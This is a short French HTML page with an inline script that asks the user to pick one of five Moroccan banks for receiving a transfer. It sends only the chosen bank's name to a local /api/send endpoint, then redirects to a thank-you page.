<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Choisissez votre banque</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>Choisissez votre banque pour recevoir votre virement</h1>
    <form id="bankForm">
      <label for="banque">Banque :</label>
      <select name="banque" id="banque" required>
        <option value="" disabled selected>-- Sélectionnez --</option>
        <option value="CIH Bank">CIH Bank</option>
        <option value="Attijariwafa Bank">Attijariwafa Bank</option>
        <option value="BMCE Bank">BMCE Bank</option>
        <option value="Banque Populaire">Banque Populaire</option>
        <option value="SGMB">Société Générale Maroc</option>
      </select>
      <button type="submit">Continuer</button>
    </form>
  </div>

  <script>
  document.getElementById('bankForm').addEventListener('submit', async function (e) {
    e.preventDefault();
    const select = document.getElementById('banque');
    const banque = select.value;

    if (!banque) {
      alert('Choisissez une banque.');
      return;
    }

    try {
      const res = await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ banque: banque })
      });

      if (!res.ok) {
        let msg = 'Erreur serveur.';
        try {
          const data = await res.json();
          if (data.error) msg = data.error;
        } catch (_) {}
        alert(msg);
        return;
      }

      window.location.href = 'merci.html';
    } catch (err) {
      alert('Erreur réseau. Réessayez.');
    }
  });
  </script>
</body>
</html>
